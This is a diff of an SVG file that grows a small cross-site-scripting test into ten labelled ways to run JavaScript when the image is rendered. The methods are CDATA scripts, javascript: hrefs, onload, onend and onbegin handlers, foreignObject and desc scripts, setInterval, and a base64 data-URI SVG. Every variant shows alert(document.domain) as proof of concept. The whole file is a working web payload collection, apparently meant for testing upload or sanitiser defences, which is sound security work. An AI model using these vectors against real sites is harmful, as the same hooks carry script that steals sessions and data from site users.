@@ -1,9 +1,45 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-    <rect width="100%" height="100%" fill="white"/>
-    <animate onbegin="alert(document.domain)" />
-        <script>
-        <![CDATA[
-            setTimeout(function(){alert(document.domain)}, 0);
-        ]]>
-    </script>
+    <!-- 1. Inline Script with CDATA -->
+    <script><![CDATA[
+        setTimeout(function(){alert('Domain: ' + document.domain)}, 0);
+    ]]></script>
+
+    <!-- 2. Animation with attributeName 'href' -->
+    <animate attributeName="href" to="javascript:alert('Domain: ' + document.domain)" begin="0s" />
+
+    <!-- 3. Hidden Image onload with setTimeout -->
+    <image xlink:href="#" onload="setTimeout(()=>alert('Domain: ' + document.domain), 0)" style="display:none;" />
+
+    <!-- 4. Clickable Link using xlink:href with JavaScript -->
+    <text>
+        <a xlink:href="javascript:alert('Domain: ' + document.domain)">Click me!</a>
+    </text>
+
+    <!-- 5. foreignObject with standard HTML script tag -->
+    <foreignObject width="100" height="100">
+        <body xmlns="http://www.w3.org/1999/xhtml">
+            <script>alert('Domain: ' + document.domain);</script>
+        </body>
+    </foreignObject>
+
+    <!-- 6. Use of setInterval in CDATA -->
+    <script><![CDATA[
+        setInterval(function(){alert('Interval Triggered: ' + document.domain)}, 1000);
+    ]]></script>
+
+    <!-- 7. SVG onload event on a hidden foreignObject -->
+    <foreignObject width="1" height="1">
+        <img src="#" onload="alert('Domain: ' + document.domain)" style="display:none;" />
+    </foreignObject>
+
+    <!-- 8. Script within desc tag (Some parsers render desc tags) -->
+    <desc>
+        <script>alert('Domain: ' + document.domain);</script>
+    </desc>
+
+    <!-- 9. AnimateMotion with onend attribute -->
+    <animateMotion onend="alert('Domain: ' + document.domain)" dur="0.1s" />
+
+    <!-- 10. Embedded Base64 encoded JavaScript URI in xlink:href -->
+    <image xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKSIgLz4=" style="display:none;" />
 </svg>
